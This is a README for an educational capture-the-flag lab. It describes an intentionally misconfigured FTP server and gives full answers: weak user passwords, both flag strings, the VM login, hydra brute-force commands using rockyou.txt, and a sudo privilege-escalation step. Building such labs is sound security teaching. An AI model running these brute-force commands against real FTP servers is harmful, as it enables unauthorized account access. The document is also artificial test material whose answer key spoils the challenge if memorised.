# FTP and Brute Force Lab

This lab allows students to apply brute force and privilege escalation techniques in a realistic environment. The goal is to access an FTP server with insecure configuration and retrieve two hidden flags in the system. This way, students will understand:

- How an FTP server works and anonymous access.
- Using password brute force with the `hydra` tool.
- Reading hidden clues in files accessible via FTP.
- Connecting as a discovered user using a dictionary.
- Escalating privileges on a Linux system to access as `root`.

## Machine Specifications

- **Operating System**: Ubuntu Server (no graphical interface)
- **Active Service**: `vsftpd` on port 21
- **Anonymous Access** enabled: `/home/ftp/anonymous/IMPORTANT`
- **Vulnerable Users**:
    - `james` → password: `superman`
    - `caroline` → password: `babygirl`
- **Privileges**:
    - `caroline` belongs to the `sudo` group
- **Challenge Flags**:
    - `/home/james/flag.txt`:  
        `4GEEKS{C0ngr4tul4t10ns_4_UR_F1R5T_FL4G!!!}`
    - `/root/flag.txt`:  
        `4GEEKS{C4R0L1N3_N33D5_A_B3TT3R_P455W0RD!!!}`


### Machine Credentials

```bash
servername: ftp-lab
username: student
password: 4geeks-lab
```

## Expected steps for students

1. **Connect as an anonymous user via FTP**:

     ```bash
     ftp <IP_VM>
     ```

2. **Read the instructions.txt file in `/IMPORTANT`**: The file suggests that users james and caroline need to change their passwords.

3. **Perform brute force with hydra and `rockyou.txt`**:

     ```bash
     hydra -l james -P /usr/share/wordlists/rockyou.txt ftp://<IP_VM>
     hydra -l caroline -P /usr/share/wordlists/rockyou.txt ftp://<IP_VM>
     ```

4. **Connect as james via FTP and retrieve the first flag**:

     ```bash
     ftp <IP_VM>
     # login: james
     # password: superman
     ```

     ```bash
     get flag.txt
     ```

5. **Connect as caroline (via SSH or FTP)**

6. **Escalate privileges to read the second flag**:

     ```bash
     sudo cat /root/flag.txt
     ```
